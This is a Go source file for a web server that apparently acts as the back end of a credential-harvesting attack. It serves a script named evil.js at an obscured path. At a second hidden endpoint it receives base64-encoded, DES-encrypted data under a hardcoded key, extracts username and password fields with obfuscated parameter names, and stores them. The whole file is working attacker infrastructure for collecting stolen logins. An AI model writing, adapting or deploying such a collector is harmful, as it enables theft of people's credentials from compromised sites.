package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"

	"github.com/AmyangXYZ/sweetygo/middlewares"

	"github.com/AmyangXYZ/sweetygo"
)

var key = []byte("MiaoMiao")

func main() {
	app := sweetygo.New("./", nil)
	app.USE(middlewares.Logger(os.Stdout))
	app.GET("/", index)
	app.GET("/static/*files", static)
	app.GET("/0b10813e85c20b58a023440d9f58d7e2", eviljs)
	app.POST("/f701fee85540b78d08cb276d14953d58", recv)
	app.RunServer(":8001")
}

func index(ctx *sweetygo.Context) {
	ctx.Render(200, "index")
}

func static(ctx *sweetygo.Context) {
	staticHandle := http.StripPrefix("/static",
		http.FileServer(http.Dir("./static")))
	staticHandle.ServeHTTP(ctx.Resp, ctx.Req)
}

func eviljs(ctx *sweetygo.Context) {
	dat, _ := ioutil.ReadFile("./evil.js")
	ctx.Text(200, string(dat))
}

func recv(ctx *sweetygo.Context) {
	origtext := ctx.Param("data")

	buf, _ := base64.StdEncoding.DecodeString(origtext)
	destext, err := DesDecrypt(buf, key)
	if err != nil {
		fmt.Println(err)
		return
	}

	params, _ := url.ParseQuery(string(destext))
	if len(params["hrUW3PG7mp3RLd3dJu"]) > 0 && len(params["LxMzAX2jog9Bpjs07jP"]) > 0 {
		username := params["hrUW3PG7mp3RLd3dJu"][0]
		password := params["LxMzAX2jog9Bpjs07jP"][0]
		insert(username, password)
	}
}
